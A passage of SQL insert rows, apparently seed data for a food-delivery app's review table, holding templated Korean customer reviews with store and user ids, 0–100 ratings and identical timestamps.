	(651, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 10, 18, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(652, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(653, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 10, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(654, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(655, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 12, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(656, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 15, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(657, '서비스는 별로였고, 음식의 퀄리티도 아쉬웠어요. 다른 곳에서 시도해볼 만한 가치는 없었습니다.', 12, 17, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(658, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 11, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(659, '음식이 맛있었고, 서비스도 만족스러웠어요.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(660, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 14, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(661, '서비스 태도도 좋았고, 음식도 맛있었어요.', 11, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(662, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(663, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(664, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(665, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 11, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(666, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 10, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(667, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(668, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 13, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(669, '서비스 태도도 좋았고, 음식도 맛있었어요.', 11, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(670, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 13, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(671, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 15, 13, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(672, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(673, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(674, '서비스 태도가 좋지 않았고, 음식도 별로였어요.', 10, 15, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(675, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 15, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(676, '음식이 매우 짜서 입맛에 맞지 않았습니다.', 13, 12, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(677, '서비스도 엉망이었고, 음식도 실망스러웠어요.', 13, 21, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(678, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(679, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 13, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(680, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(681, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(682, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 11, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(683, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 15, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(684, '주문한 음식이 완전히 다른 것이 왔고, 맛도 별로였어요.', 10, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(685, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 13, 11, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(686, '주문한 음식은 그럭저럭 맛있었지만, 배달이 조금 늦었어요.', 13, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(687, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 15, 18, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(688, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 15, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(689, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(690, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 11, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(691, '음식의 맛은 그저 그랬어요. 특별한 인상을 남기지 않았습니다.', 10, 12, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(692, '음식의 맛과 가격이 모두 만족스러웠습니다.', 14, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(693, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(694, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(695, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 13, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(696, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(697, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 11, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(698, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 10, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(699, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(700, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 15, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(701, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(702, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 11, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(703, '음식의 맛과 양 모두 만족스러웠습니다.', 11, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(704, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(705, '음식의 맛과 양 모두 만족스러웠습니다.', 12, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(706, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(707, '최악의 경험. 주문한 음식이 완전히 망가졌어요.', 12, 17, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(708, '음식이 맛있었고, 서비스도 만족스러웠어요.', 14, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(709, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 14, 19, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(710, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 10, 16, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(711, '음식의 맛과 양 모두 만족스러웠습니다.', 11, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(712, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(713, '음식이 맛있었고, 서비스도 만족스러웠어요.', 13, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(714, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 15, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(715, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(716, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 13, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(717, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(718, '서비스는 평범했지만, 음식의 퀄리티가 아쉬웠어요.', 12, 12, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(719, '서비스 태도도 좋았고, 음식도 맛있었어요.', 11, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(720, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 13, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(721, '음식의 맛은 그저 그랬어요. 기대한 만큼의 풍부한 맛은 아니었습니다.', 11, 12, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(722, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(723, '최악의 경험. 주문한 음식이 완전히 망가졌어요.', 13, 13, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(724, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 10, 18, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(725, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 14, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(726, '음식은 평범한 수준이었고, 특별한 매력을 느끼지 못했습니다.', 13, 14, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(727, '음식의 맛은 나쁘지 않았지만, 가격 대비 아쉬웠어요.', 14, 19, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(728, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 13, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(729, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(730, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(731, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 11, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(732, '절대로 다시 주문하지 않을 것입니다. 최악의 경험이었습니다.', 10, 20, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(733, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 13, 19, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(734, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 15, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(735, '서비스 태도가 좋지 않았고, 음식도 별로였어요.', 15, 15, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(736, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(737, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 13, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(738, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 12, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(739, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(740, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 14, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(741, '음식이 맛있었고, 서비스도 만족스러웠어요.', 11, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(742, '음식의 맛과 양 모두 만족스러웠습니다.', 11, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(743, '음식이 완전히 차가웠고, 서비스도 별로였어요.', 13, 14, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(744, '음식이 맛이 없어서 먹기 힘들었어요.', 15, 13, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(745, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(746, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(747, '음식이 맛있었고, 서비스도 만족스러웠어요.', 13, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(748, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(749, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(750, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 15, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(751, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(752, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(753, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(754, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(755, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 11, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(756, '음식의 맛과 가격이 모두 만족스러웠습니다.', 12, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(757, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(758, '음식의 맛과 양 모두 만족스러웠습니다.', 13, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(759, '주문한 음식은 그럭저럭 맛있었지만, 배달이 조금 늦었어요.', 11, 18, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(760, '주문한 음식은 그럭저럭 맛있었지만, 배달이 조금 늦었어요.', 13, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(761, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(762, '음식은 평범한 수준이었고, 특별한 매력을 느끼지 못했습니다.', 13, 13, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(763, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 12, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(764, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(765, '주문한 음식이 전혀 맞지 않았고, 맛도 없었어요.', 13, 16, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(766, '음식의 맛과 양 모두 만족스러웠습니다.', 14, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(767, '절대로 다시 주문하지 않을 것입니다. 최악의 경험이었습니다.', 12, 17, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(768, '서비스는 별로였고, 음식의 퀄리티도 아쉬웠어요. 다른 곳에서 시도해볼 만한 가치는 없었습니다.', 11, 16, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(769, '음식이 완전히 차가웠고, 서비스도 별로였어요.', 12, 13, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(770, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 12, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(771, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 15, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(772, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 12, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(773, '음식이 맛있었고, 서비스도 만족스러웠어요.', 11, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(774, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 11, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(775, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 15, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(776, '서비스 태도도 좋았고, 음식도 맛있었어요.', 12, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(777, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 11, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(778, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 15, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(779, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 10, 20, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(780, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(781, '음식이 맛이 없어서 먹기 힘들었어요.', 15, 19, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(782, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(783, '서비스 태도도 좋았고, 음식도 맛있었어요.', 15, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(784, '음식의 맛은 나쁘지 않았지만, 가격 대비 아쉬웠어요.', 11, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(785, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 15, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(786, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(787, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(788, '음식이 맛이 없어서 먹기 힘들었어요.', 15, 22, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(789, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(790, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 13, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(791, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(792, '음식의 맛과 가격이 모두 만족스러웠습니다.', 12, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(793, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 11, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(794, '음식이 맛있었고, 서비스도 만족스러웠어요.', 14, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(795, '서비스 태도가 좋지 않았고, 음식도 별로였어요.', 11, 12, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(796, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(797, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(798, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(799, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(800, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 14, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(801, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 13, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(802, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 13, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(803, '음식이 맛있었고, 서비스도 만족스러웠어요.', 10, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(804, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(805, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 15, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(806, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 15, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(807, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 13, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(808, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 12, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(809, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 14, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(810, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(811, '음식이 맛있었고, 서비스도 만족스러웠어요.', 14, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(812, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(813, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(814, '서비스 태도도 좋았고, 음식도 맛있었어요.', 13, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(815, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(816, '서비스는 평범했지만, 음식의 퀄리티가 아쉬웠어요.', 11, 20, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(817, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(818, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 13, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(819, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 13, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(820, '음식이 맛있었고, 서비스도 만족스러웠어요.', 15, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(821, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(822, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(823, '음식이 너무 맛이 없었습니다. 정말 실망했어요.', 11, 16, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(824, '음식이 맛있었고, 서비스도 만족스러웠어요.', 12, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(825, '주문한 음식이 완전히 다른 것이 왔고, 맛도 별로였어요.', 11, 19, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(826, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 10, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(827, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(828, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 14, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
